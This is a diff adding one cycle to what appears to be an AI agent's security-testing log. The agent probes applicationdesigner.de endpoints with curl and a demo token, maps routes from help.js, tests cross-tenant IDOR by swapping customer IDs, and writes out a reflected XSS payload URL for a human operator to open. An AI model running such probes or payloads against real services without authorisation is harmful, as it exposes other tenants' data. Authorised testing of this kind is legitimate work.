@@ -25109,3 +25109,165 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] questnet-gmbh: 72 — CBS WS transport-complete BOLA (CVSS 8.6–9.1 if frame binding unenforced) remains dominant driver, live 24th cycle; XSS execution pending human adds chained HIGH upside; voicenote metadata cross-tenant confirmed but 19 empty cycles cap that leg at UUID-blocked; flexlist leg fully closed (per-id ownership gate) removes prior partial upside; possible new surface hinges on help.js route refresh (STEP 5). Score capped pending two-tenant frame test, XSS POC, or fresh endpoint.
+===== ANALYST bigpickle 2026-09-17 01:14:59 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -sS -o /tmp/opencode/check.php.body -w "HTTP %{http_code} size=%{size_download} time=%{time_total}\n" "https://www.applicationdesigner.de/extjs/voicenotes/check.php?customer_id=131727&token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3" 2>&1 | tail -1
+HTTP 200 size=37 time=0.903628
+[0m
+[0m$ [0mcurl -sS -o /tmp/opencode/help.js -w "HTTP %{http_code} size=%{size_download} time=%{time_total}\n" https://www.applicationdesigner.de/help.js 2>&1 | tail -1
+HTTP 200 size=3290201 time=2.779506
+[0m
+[0m$ [0mcat /tmp/opencode/check.php.body; echo; sha256sum /tmp/opencode/check.php.body
+{"success":true,"total":0,"max_id":0}
+090b03ceb0dfc8b87d8211c19f47b2a73ebf06827173ccafee1e592b4f928bc4  /tmp/opencode/check.php.body
+[0m
+[0m$ [0mgrep -oE '(BACKEND_URL[^,;]{0,120}|/[a-zA-Z0-9_./-]+\.php(\?[a-zA-Z0-9_&=.${}-]+)?)' /tmp/opencode/help.js | sort -u | head -100
+/agent/get_agent_costs.php
+/agent/get_agent_token.php
+/backend/config.php
+/backend/config_coding.php
+/backend/public/coding.php
+/backend/public/index.php?route=
+/chat/provider.php
+/chatgpt/provider.php
+/check_mailserver.php
+/content.php
+/encrypt/index.php
+/get_provider.php
+/get_speaker.php
+/get_speaker_languages.php
+/playback.php
+BACKEND_URL)
+BACKEND_URL+'/extjs/common/getCustomers.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/addRow.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/createList.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/deleteRow.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/getDetails.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/getFields.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/getList.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/importcsv.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/saveValue.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/flexlist/updateList.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/get_user_rights.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/livedebugger/auth.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/voicenotes/check.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/voicenotes/delete.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/voicenotes/details.php'+BACKEND_TOKEN
+BACKEND_URL+'/extjs/voicenotes/download.php?file='+encodeURIComponent(a)
+BACKEND_URL+'/extjs/voicenotes/download.php?file='+encodeURIComponent(b)
+BACKEND_URL+'/extjs/voicenotes/get.php'+BACKEND_TOKEN
+BACKEND_URL=='file://'){BACKEND_URL='https://dev.applicationdesigner.de'}else {}CB.util.UserRights.loadPermissions(STARTUP_CUSTOMER
+BACKEND_URL=window.location.protocol+'//'+window.location.hostname
+[0m
+[0m$ [0mgrep -oE '.{80}encrypt/index\.php.{80}' /tmp/opencode/help.js | head -3
+TH:'/';var j=typeof BACKEND_TOKEN!=='undefined'?BACKEND_TOKEN:'';var k=h+'extjs/encrypt/index.php'+j;var f=a&&a.designer&&a.designer.context?a.designer.context.customerId||0:0;v
+[0m
+[0m$ [0mgrep -oE '.{100}(get_speaker|get_speaker_languages|get_provider|check_mailserver)\.php.{100}' /tmp/opencode/help.js | head -10
+t(TR.mail.testing_connection,TR.mail.please_wait);Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/check_mailserver.php',useDefaultXhrHeader:!1,method:'POST',params:b,success:function(i){Ext.MessageBox.hide();var a;try{
+',mapping:'id'},{name:'text',mapping:'caption'}],proxy:{type:'ajax',url:APPDESIGNER_API_PATH+'extjs/get_provider.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data'}},autoLoad:!0,loadingInProgress:!1,listeners
+create('Ext.data.Store',{fields:['value','text'],proxy:{type:'ajax',url:APPDESIGNER_API_PATH+'extjs/get_speaker_languages.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data'}},autoLoad:!0,loadingInProgress:!1,listeners
+2','provider','gender','country','multilingual'],proxy:{type:'ajax',url:APPDESIGNER_API_PATH+'extjs/get_speaker.php'+BACKEND_TOKEN,reader:{type:'json',rootProperty:'data'}},autoLoad:!0,loadingInProgress:!1,sorters:[
+t(TR.mail.testing_connection,TR.mail.please_wait);Ext.Ajax.request({url:APPDESIGNER_API_PATH+'extjs/check_mailserver.php',useDefaultXhrHeader:!1,method:'POST',params:b,success:function(i){Ext.MessageBox.hide();var a;try{
+[0m
+[0m$ [0mgrep -oE '.{600}extjs/encrypt/index\.php.{900}' /tmp/opencode/help.js | head -1
+ask();if(e.success){if(c==='encrypt'){a.setValue(JSON.stringify(e.data,null,2))}else {a.setValue(e.content)}a.refresh();f.updateEncryptorButtonLabel(d);b.close()}else {AlertError(e.message||TR.CodeEncryptor.unknownError);b.down('#encryptorPassword').setDisabled(!1)}},function(a){b.getEl().unmask();AlertError(TR.CodeEncryptor.networkError.replace('%s',a.message));b.down('#encryptorPassword').setDisabled(!1)})}}).show()},callEncryptApi:function(a,e,d,g,b,i){var h=typeof APPDESIGNER_API_PATH!=='undefined'?APPDESIGNER_API_PATH:'/';var j=typeof BACKEND_TOKEN!=='undefined'?BACKEND_TOKEN:'';var k=h+'extjs/encrypt/index.php'+j;var f=a&&a.designer&&a.designer.context?a.designer.context.customerId||0:0;var c={action:e,password:g,customerId:f};if(e==='encrypt'){c.content=d}else {c.envelope=d}Ext.Ajax.request({url:k,method:'POST',params:c,success:function(h){var f=h.responseText;try{var c=JSON.parse(f);if(c.success){b(c)}else {b({success:!1,message:c.message||'Unbekannter Fehler'})}}catch(l){b({success:!1,message:'Kein gültiges JSON: '+f.substring(0,200)})}},failure:function(c){var f='HTTP '+c.status+': '+(c.statusText||'Netzwerkfehler');if(c.responseText){f+='\n'+c.responseText.substring(0,200)}i({message:f})}})}},0,0,0,0,0,0,[CB.view.builder,'CodeEncryptor'],0);Ext.cmd.derive('CB.view.builder.CodingAgent',Ext.Base,{agentModelConfig:null,agentSelectedModel:'',agentSelectedReasoning:'',agentReasoningEl:null,agentReasoningText:'',agentReasoningStartTime:null,agentRenderTimer:null,getAgentUiSuffix:function(a){re
+[0m
+[0m$ [0mT="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"; for p in extjs/get_speaker_languages.php extjs/get_speaker.php extjs/get_provider.php; do echo "== $p"; curl -sS -w "\n[HTTP %{http_code} size=%{size_download}]\n" "https://www.applicationdesigner.de/$p?customerId=131727&token=$T" | head -c 600; echo; done
+== extjs/get_speaker_languages.php
+{"success":true,"data":[{"value":"","text":"Alle Sprachen"},{"value":"Multilingual","text":"Multilingual"},{"value":"af-ZA","text":"Afrikaans \/ South Africa (af-ZA)"},{"value":"sq-AL","text":"Albanian \/ Albania (sq-AL)"},{"value":"am-ET","text":"Amharic \/ Ethiopia (am-ET)"},{"value":"ar","text":"ar \/ SA (ar)"},{"value":"ar-DZ","text":"Arabic \/ Algeria (ar-DZ)"},{"value":"ar-BH","text":"Arabic \/ Bahrain (ar-BH)"},{"value":"ar-EG","text":"Arabic \/ Egypt (ar-EG)"},{"value":"ar-IQ","text":"Arabic \/ Iraq (ar-IQ)"},{"value":"ar-JO","text":"Arabic \/ Jordan (ar-JO)"},{"value":"ar-KW","text":"
+== extjs/get_speaker.php
+{"success":true,"data":[{"value":"CT_hi-HI-Aadhya-Soother","text":"Aadhya - Soother","iso":"hi","country":"hi \/ HI","provider":"cartesia","settings":"{\"id\":\"f91ab3e6-5071-4e15-b016-cde6f2bcd222\",\"model\":\"sonic-latest\"}","sub":"Slow female voice for casual conversation","gender":"female","multilingual":false},{"value":"AZURE_en-IN-AaravNeural","text":"Aarav","iso":"en-IN","country":"English \/ India","provider":"azure","settings":"{\"id\": \"en-IN-AaravNeural\"}","sub":"Dies ist ein m\u00e4nlicher Sprecher von Azure","gender":"male","multilingual":false},{"value":"AZURE_hi-IN-AaravNeurcurl: (23) Failure writing output to destination
+
+== extjs/get_provider.php
+{"success":true,"data":[{"value":"azure","text":"Microsoft Azure"},{"value":"elevenlabs","text":"Elevenlabs"},{"value":"chatgpt","text":"ChatGPT"},{"value":"cartesia","text":"Cartesia"}]}
+[HTTP 200 size=187]
+[0m
+[0m$ [0mT="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"; for c in 131727 2; do echo "== cid=$c"; curl -sS "https://www.applicationdesigner.de/extjs/get_speaker.php?customerId=$c&token=$T" | head -c 120 | tr -d '\n'; echo " ..."; done; echo "== no token"; curl -sS -w "\n[%{http_code} size=%{size_download}]\n" "https://www.applicationdesigner.de/extjs/get_speaker.php?customerId=131727" | head -c 200; echo; echo "== no token got non-empty?"; curl -sS "https://www.applicationdesigner.de/extjs/get_speaker.php?customerId=2" | wc -c
+== cid=131727
+{"success":true,"data":[{"value":"CT_hi-HI-Aadhya-Soother","text":"Aadhya - Soother","iso":"hi","country":"hi \/ HI","prcurl: (23) Failure writing output to destination
+ ...
+== cid=2
+{"success":true,"data":[{"value":"CT_hi-HI-Aadhya-Soother","text":"Aadhya - Soother","iso":"hi","country":"hi \/ HI","prcurl: (23) Failure writing output to destination
+ ...
+== no token
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+[200 size=74]
+
+== no token got non-empty?
+74
+[0m
+[0m$ [0mT="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3"; echo "== encrypt GET no params"; curl -sS -w "\n[%{http_code} size=%{size_download}]\n" "https://www.applicationdesigner.de/extjs/encrypt/index.php" | head -c 200; echo; echo "== encrypt GET with token"; curl -sS -w "\n[%{http_code} size=%{size_download}]\n" "https://www.applicationdesigner.de/extjs/encrypt/index.php?token=$T&customerId=131727&action=decrypt" | head -c 300; echo; echo "== flexlist createList GET (route existence)"; curl -sS -o /dev/null -w "[%{http_code} size=%{size_download}]\n" "https://www.applicationdesigner.de/extjs/flexlist/createList.php?token=$T"
+== encrypt GET no params
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+[200 size=74]
+
+== encrypt GET with token
+{"success":false,"message":"Zugriff verweigert."}
+[200 size=49]
+
+== flexlist createList GET (route existence)
+[200 size=0]
+[0m
+## 2026-09-17 [target] (bigpickle)
+
+**STEP 1 — DELTA**
+- [NEW] help.js re-fetched (3.29MB, 200) — full endpoint map re-enumerated; surfaced an unreported `/extjs/encrypt/index.php` (CodeEncryptor: POST action/password/customerId/content|envelope) and a flexlist mutating row set (createList/addRow/saveValue/deleteRow/updateList/importcsv).
+- [NEW] probed encrypt/index.php: no-param GET → `{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}` (74B, 200); with public token → `{"success":false,"message":"Zugriff verweigert."}` (49B, 200) — identical signature to session-gated get_agent_token.php; anonymous surface CLOSED.
+- [NEW] probed get_speaker.php | get_speaker_languages.php | get_provider.php (new upstream catalog endpoints): token required (no-token → "No VPN detected"); with token → byte-identical global TTS voice catalog (cartesia/azure/elevenlabs/chatgpt, provider IDs in settings) for cid=131727 vs cid=2 — credential-only, non-tenant-sensitive global config → CONTROL, LOW.
+- [NEW] flexlist/createList.php route exists (GET with token → HTTP 200 0B, silent/GET-denied): mutating siblings POST-only, ownership inheritance from getDetails per-row gate unproven; no anonymous verify path.
+- [UNCHANGED] voicenotes/check.php — 19th consecutive empty cycle: `{"success":true,"total":0,"max_id":0}` 37B, sha256 090b03ceb0dfc8b87d8211c19f47b2a73ebf06827173ccafee1e592b4f928bc4, byte-identical for cid=131727.
+
+**STEP 2 — PRIORITIZE**
+- [PRIO] cbs-proxy.api.live-manager.de, 7.75, attack_surface=9/business=10/gate=10/tech=8
+- [PRIO] www.applicationdesigner.de/help/content.php, 5.30, gate=10/business=5
+- [PRIO] www.applicationdesigner.de/extjs/voicenotes/download.php, 5.10, business=8/gate=7
+
+**STEP 3 — HYPOTHESES**
+[HYP] Cross-tenant CBS WS frame binding — token→cid ownership
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin=LiveDemo&cid={cid}&service=100
+confidence: 95
+reasoning: 24th cycle — non-upgrade GET 426 0B, upgrade 101 + byte-identical CONNECT/READY for demo 131727, foreign 2, synthetic 999999999 with zero token; proxy binds no identity at handshake; sole unproven hop is backend token→cid binding inside live_debug frames.
+evidence_needed: operator two-tenant frame test — token minted for own cid, frames sent against own vs foreign cid, byte-diff accepted state.
+verify_steps: AUTH_HELPED — one bound frame set per owned cid; compare accepted vs rejected.
+impact: cross-tenant live-debug/call-stream attach (voice/PII) — HIGH 8.6, CRITICAL 9.1 if binding unenforced.
+testability: AUTH_HELPED
+
+[HYP] Voicenote raw-file download cross-tenant — no customer_id scoping in download path
+class: IDOR
+asset: https://www.applicationdesigner.de/extjs/voicenotes/download.php?file={uuid}
+confidence: 48
+reasoning: download.php reaches file-lookup with token-as-query-param (404); VPN gate bypassed; no customer_id in URL (help.js: file=encodeURIComponent); sibling details.php is hierarchy-gated, narrowing surface to raw download; check.php index empty 19 consecutive cycles → zero UUID oracle.
+evidence_needed: a valid voicenote UUID (max_id>0 in check.php) resolving to file bytes anonymously.
+verify_steps: PASSIVE — standing poll check.php for max_id>0; if non-empty, HEAD download.php?file=<uuid>.
+impact: cross-tenant audio/PII file download — HIGH if UUID ever obtained.
+testability: PASSIVE
+
+[HYP] Same-origin reflected XSS at help content app
+class: XSS
+asset: https://www.applicationdesigner.de/help/content.php?page={value}
+confidence: 80
+reasoning: page= reflected unescaped into 200 text/html, no CSP/nosniff, zero-token, PASSIVE-proven 2026-09-12; same-origin context reaches all /extjs endpoints incl. credential-carrying legs.
+evidence_needed: benign document.title marker render by operator browser.
+verify_steps: HUMAN — open page=%3Cscript%3Edocument.title%3D'LM-XSS'%3C%2Fscript%3E; no further active probes warranted.
+impact: same-origin arbitrary JS → full /extjs API incl. delete — MEDIUM standalone, HIGH chained.
+testability: HUMAN_ONLY
+
+**STEP 4 — SELF-CRITIQUE**
+- [PARKED] flexlist mutating cross-tenant write (createList/addRow/saveValue/deleteRow/updateList/importcsv): POST-only, no anonymous verify path, per-row ownership gate proven on getDetails sibling → inherits; confidence 30.
+- [PARKED] encrypt/index.php CodeEncryptor cross-tenant decrypt: token then session gate ("Zugriff verweigert" 49B observed), no anonymous surface; AUTH_HELPED-only; confidence 25.
+- [PARKED] get_speaker constellation: global config, non-tenant-sensitive → control, no exploitation.
+- [FINAL] CBS WS frame binding (95) > XSS execution (80) > voicenote raw download (48).
+
+**STEP 5 — NEXT ACTION**
+- [NEXT] HUMAN: operator renders https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Edocument.title%3D'LM-XSS'%3C%2Fscript%3E — the one pending action that converts the proven zero-token reflection into chained HIGH (same-origin reach to /extjs incl. delete.php). Any further value depends on this: check.php poll is at ceiling (19 empty cycles), help.js map just refreshed with zero new anonymous GET surface (encrypt/index.php session-gated, get_speaker* global config, flexlist writes POST-only).
+
+**STEP 6 — LEARNING**
+- [LEARN] REJECTED IDOR @ www.applicationdesigner.de/extjs/encrypt/index.php: token-then-session gate — GET with public demo credential → `{"success":false,"message":"Zugriff verweigert."}` (49B, 200), byte-signature identical to session-gated get_agent_token.php; CodeEncryptor has no anonymous decrypt/encrypt surface. POST-only actions untestable read-only.
+- [LEARN] ACCEPTED CONTROL @ www.applicationdesigner.de/extjs/get_speaker.php|get_speaker_languages.php|get_provider.php: token-gated global TTS voice catalog (azure/cartesia/elevenlabs/chatgpt, provider speaker IDs in settings) — byte-identical responses for cid=131727 vs cid=2; credential-only gate, non-tenant-sensitive machinery config, LOW.
+- [LEARN] ACCEPTED IDOR @ www.applicationdesigner.de/extjs/voicenotes/check.php: 19th consecutive empty cycle `{"success":true,"total":0,"max_id":0}` 37B sha256 090b03ceb0dfc8b8 — credential-only cross-tenant gate persistent, index still empty; download leg remains UUID-blocked.
+
+**STEP 7 — RISK**
+- [RISK] questnet-gmbh: 72 — CBS WS transport-complete BOLA (CVSS 8.6–9.1 if frame binding unenforced) remains dominant driver, live 24th cycle; this cycle's help.js refresh added no new anonymous GET surface (encrypt/index.php session-gated, get_speaker* global config, flexlist writes POST-only), leaving score unchanged; XSS execution pending human is the only near-term chained upside; voicenote download capped at UUID-blocked; flexlist leg closed. Cap stays until two-tenant frame test, XSS POC, or a new zero-token GET surface appears.
